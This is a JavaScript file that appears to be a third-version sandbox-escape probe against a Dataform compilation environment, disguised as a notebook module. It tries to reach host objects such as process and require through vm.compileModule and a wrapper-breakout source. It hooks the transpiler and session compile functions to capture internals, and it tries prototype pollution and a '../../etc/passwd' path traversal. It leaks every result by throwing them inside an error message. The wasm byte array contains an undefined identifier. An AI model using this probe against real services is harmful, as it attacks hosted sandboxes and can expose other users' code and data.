// v3 — vm.compileModule abuse + transpiler hook + core internals

var out = {};
function safe(k, fn) {
  try {
    var v = fn();
    out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 1500);
  } catch(e) {
    out[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 400);
  }
}

// ============ TIER A: vm.compileModule with proper 2-arg signature ============
safe('A1_compileModule_2arg_iife', function() {
  var c = vm.compileModule('attacker.js', '(() => 42)()');
  return 'type=' + typeof c + ' src=' + String(c).substring(0,300);
});

safe('A2_compileModule_arrow_callable', function() {
  // Mimics what require() does
  var src = "((module, exports, __dirname, __filename) => { module.exports = { test: 42, dir: __dirname, file: __filename, env_keys: Object.keys(globalThis).slice(0,5).join(',') }; })";
  var c = vm.compileModule('test.js', src);
  if (typeof c === 'function') {
    var mod = { exports: {} };
    c(mod, mod.exports, '/test/dir', '/test/file.js');
    return JSON.stringify(mod.exports);
  }
  return 'type=' + typeof c;
});

safe('A3_compileModule_eval_process', function() {
  // Try to access host primitives through compileModule
  var src = "((module) => { try { module.exports = { p: typeof process, b: typeof Buffer, r: typeof require, g: typeof global }; } catch(e) { module.exports = { err: e.message }; } })";
  var c = vm.compileModule('probe.js', src);
  var mod = { exports: {} };
  c(mod, mod.exports, '/', '/probe.js');
  return JSON.stringify(mod.exports);
});

safe('A4_compileModule_wrap_breakout', function() {
  // Try to break out of typical wrap via source crafting
  // If vm.compileModule is sensitive to balanced parens, source like `});\nactualPayload\n((module)=>{` might break out
  var src = "((module) => { return 'inside'; });\nthrow new Error('BREAKOUT_TOP_LEVEL_EXECUTED');\n((m)=>{ return null; })";
  try {
    var c = vm.compileModule('escape.js', src);
    return 'compiled type=' + typeof c + ' src=' + String(c).substring(0,200);
  } catch(e) { return 'err:' + e.message; }
});

safe('A5_compileModule_strict_mode_check', function() {
  // 'use strict' / let / class etc. — do these enable new primitives?
  var src = "(() => { 'use strict'; class P { static get x() { return typeof process; } }; return P.x; })()";
  var c = vm.compileModule('strict.js', src);
  return 'src=' + String(c).substring(0,300);
});

// ============ TIER B: require.transpiler hook ============
safe('B1_transpiler_hook_install', function() {
  if (typeof require.transpiler !== 'function') return 'no_transpiler';
  var orig = require.transpiler;
  globalThis.__transpilerLog = [];
  require.transpiler = function(source, filename) {
    try {
      globalThis.__transpilerLog.push({
        f: filename,
        len: source ? source.length : 0,
        head: source ? String(source).substring(0,200) : null
      });
    } catch(e) {}
    return orig.apply(this, arguments);
  };
  return 'installed';
});

// ============ TIER C: @dataform/core deep ============
safe('C1_core_compiler_keys', function() {
  return Object.getOwnPropertyNames(core.compiler).join(',') + ' | proto:' + Object.getOwnPropertyNames(Object.getPrototypeOf(core.compiler) || {}).join(',');
});
safe('C2_core_compiler_src', function() { return String(core.compiler).substring(0, 600); });
safe('C3_core_session_keys', function() {
  return Object.getOwnPropertyNames(core.session).join(',') + ' | proto:' + Object.getOwnPropertyNames(Object.getPrototypeOf(core.session) || {}).join(',');
});
safe('C4_core_session_src', function() { return String(core.session).substring(0, 800); });
safe('C5_core_main_src', function() { return String(core.main).substring(0, 800); });
safe('C6_core_indexFileGenerator_src', function() { return String(core.indexFileGenerator).substring(0, 800); });
safe('C7_core_supportedFeatures', function() { return JSON.stringify(core.supportedFeatures); });
safe('C8_core_version', function() { return String(core.version); });

// ============ TIER D: create another core.session instance ============
safe('D1_new_session_check', function() {
  try {
    // session is probably a class — try instantiating
    if (typeof core.session === 'function') {
      var dummyConfig = { projectConfig: { warehouse: 'bigquery', defaultDatabase: 'pwn-via-new-session' }, rootDir: '.' };
      var s = new core.session(dummyConfig);
      return 'made session, keys=' + Object.getOwnPropertyNames(s).join(',');
    }
    return 'session not constructable, typeof=' + typeof core.session;
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER E: O.dataform protobuf access ============
// session.compile uses O.dataform.CompiledGraph.create — can we reach O?
// Try via session.compile.toString() string extraction
safe('E1_session_compile_str_search', function() {
  var src = String(global._DF_SESSION.compile);
  // Search for dataform.* references
  var matches = src.match(/[a-zA-Z_$][\w$]*\.dataform\.[\w]+/g) || [];
  return JSON.stringify(matches.slice(0, 30));
});
safe('E2_session_test_for_O', function() {
  // The local variable 'O' in compile is a closure. Try to leak it via call patterns.
  // Replace compile with a function that captures 'this' and arguments
  var origCompile = global._DF_SESSION.compile;
  globalThis.__capturedCompileCtx = null;
  global._DF_SESSION.compile = function() {
    try {
      globalThis.__capturedCompileCtx = {
        this_keys: Object.keys(this).slice(0,30),
        args_count: arguments.length,
        compile_str: String(origCompile).substring(0,1500)
      };
    } catch(e) { globalThis.__capturedCompileCtx = {err: e.message}; }
    return origCompile.apply(this, arguments);
  };
  return 'hooked compile, will capture on next call';
});

// ============ TIER F: prototype pollution via JSON / setters ============
safe('F1_json_proto_pollution_attempt', function() {
  try {
    var poisoned = JSON.parse('{"__proto__":{"PWN":"VALUE"}}');
    return 'parsed, Object.prototype.PWN=' + Object.prototype.PWN + ', proto.PWN=' + poisoned.PWN;
  } catch(e) { return 'err:' + e.message; }
});

safe('F2_object_setPrototypeOf', function() {
  try {
    var o = {};
    Object.setPrototypeOf(o, { PWNED: true });
    return 'set, o.PWNED=' + o.PWNED;
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER G: indexFileGenerator — what does it accept? ============
safe('G1_indexFileGenerator_call', function() {
  try {
    var result = core.indexFileGenerator(['definitions/v.sqlx']);
    return 'type=' + typeof result + ' val=' + String(result).substring(0,500);
  } catch(e) { return 'err:' + e.message; }
});

safe('G2_indexFileGenerator_path_traversal', function() {
  try {
    var result = core.indexFileGenerator(['../../etc/passwd']);
    return 'type=' + typeof result + ' val=' + String(result).substring(0,500);
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER H: assert global — could be Node's assert with internal access ============
safe('H1_assert_type', function() { return typeof assert; });
safe('H2_assert_keys', function() { return typeof assert === 'function' ? 'fn:' + String(assert).substring(0,300) : Object.getOwnPropertyNames(assert).join(','); });

// ============ TIER I: WebAssembly access — different compilation pathway ============
safe('I1_wasm_compile_minimal', function() {
  try {
    // Minimal wasm module — exports a function that returns 42
    var bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,7,1,3,one,0,0,10,6,1,4,0,65,42,11]);
    return 'created bytes, len=' + bytes.length;
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER J: Look for native bridged functions in any reachable object ============
safe('J1_native_in_session', function() {
  var found = [];
  var s = global._DF_SESSION;
  var keys = Object.getOwnPropertyNames(Object.getPrototypeOf(s));
  for (var k of keys) {
    try {
      var v = s[k];
      if (typeof v === 'function' && String(v).indexOf('[native code]') >= 0) {
        found.push(k);
      }
    } catch(e) {}
  }
  return found.join(',');
});

safe('J2_native_in_core', function() {
  var found = [];
  var keys = Object.getOwnPropertyNames(core);
  for (var k of keys) {
    try {
      var v = core[k];
      if (typeof v === 'function' && String(v).indexOf('[native code]') >= 0) {
        found.push(k);
      }
    } catch(e) {}
  }
  return found.join(',');
});

// Provide notebook shape
module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };

throw new Error('PROBE_v3:' + JSON.stringify(out));
